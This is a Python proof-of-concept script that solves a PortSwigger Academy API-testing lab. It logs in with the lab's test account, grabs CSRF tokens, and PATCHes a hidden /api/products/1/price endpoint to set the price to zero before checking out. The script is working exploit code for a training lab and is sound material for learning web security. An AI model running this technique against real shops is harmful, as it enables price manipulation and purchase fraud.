# Testing on Portswigger Academy Lab - API Testing - Lab: Finding and exploiting an unused API endpoint
# To solve the lab, exploit a hidden API endpoint to buy a Lightweight l33t Leather Jacket. You can log in to your own account using the following credentials: wiener:peter.
# Credit: Kestrel.hzl

from urllib import response
import requests
import sys
from bs4 import BeautifulSoup




# Get CSRF Token
def get_csrf_token(url, session):

    print("> Getting CSRF_Token")

    response = session.get(url)

    if response.status_code == 200:

        soup = BeautifulSoup(response.text, "html.parser")
        csrf_input = soup.find("input", {"name": "csrf"})

        if csrf_input:
            csrf_token = csrf_input["value"]
            print("CSRF Token :",csrf_token)
            return csrf_token
        
        else:
            print("[!] CSRF Token not found.")
            sys.exit(1)
        
    
    else:
        print("[!] Web Request Error.")
        sys.exit(1)

# Login
def login(login_url, username, password, csrf_token, session):

    print("> Logining")

    data = "csrf=" + csrf_token + "&username=" + username + "&password=" + password

    response = session.post(login_url, data=data)

    if response.status_code == 200:
        if "Invalid username or password" not in response.text:
            print("OK.")
            print("Login Cookie: session =",session.cookies.get('session'))
            
        else:
            print("Error credential.")

    else:
        print("[!] login failed.")
        print(response.text)
        print(login_url)
        sys.exit(0)

# Change Price
def change_price(base_url, session):

    print("> Changing price")

    data = "{\"price\":0}"
    headers = {"Content-Type":"application/json; charset=utf-8"}
    
    response = session.patch(base_url + "/api/products/1/price", data=data, headers=headers)

    if "{\"price\":\"$0.00\"}" in response.text:
        print("Price change to $0.00 successfully.")
    
    else:
        print("Change price error.")
        sys.exit(0)


# Add to cart
def add_cart(base_url, session):
    
    print("> Adding product to cart.")

    data = "productId=1&redir=PRODUCT&quantity=1"

    response = session.post(base_url + "/cart", data=data, allow_redirects=False)

    
    if response.status_code == 302 and '/product?productId=1' in response.headers['Location']:
        print("OK.")
    else:
        print("Add product to cart failed.")
        print(response.headers)
        print(response.status_code)
        sys.exit(0)
    

# checkout cart
def checkout_cart(base_url, session):

    print("> Checkout cart.")

    cart_url = base_url + "/cart"

    csrf_token = get_csrf_token(cart_url, session)

    data = "csrf=" + csrf_token

    response = session.post(base_url + "/cart/checkout", data=data, allow_redirects=False)

    if "/cart/order-confirmation?order-confirmed=true" in response.headers['Location']:
        print("Done!")
        sys.exit(1)
    
    else:
        print("Not buy yet.")
        print(response.headers)
        print(data)


session = requests.Session()

args = sys.argv[1:]

if len(sys.argv)<2:
    print("\nUsage:\npython3 poc.py <base_url>\n")
    print("Example: python3 poc.py https://0a5900d80378f12686cae9f7004300d2.web-security-academy.net\n")
    sys.exit(1)

base_url = args[0]


def check_url(base_url):
    if base_url.endswith('/'):
        base_url = base_url[:-1]
        return base_url
    else:
        return base_url


base_url = check_url(base_url)
username = "wiener"
password = "peter"

login_url = base_url + "/login"

csrf_token = get_csrf_token(login_url, session)

if csrf_token:
    login(login_url, username, password, csrf_token, session)
    change_price(base_url, session)
    add_cart(base_url, session)
    checkout_cart(base_url, session)


    
else:
    print("Can not get CSRF token.")
    sys.exit(1)

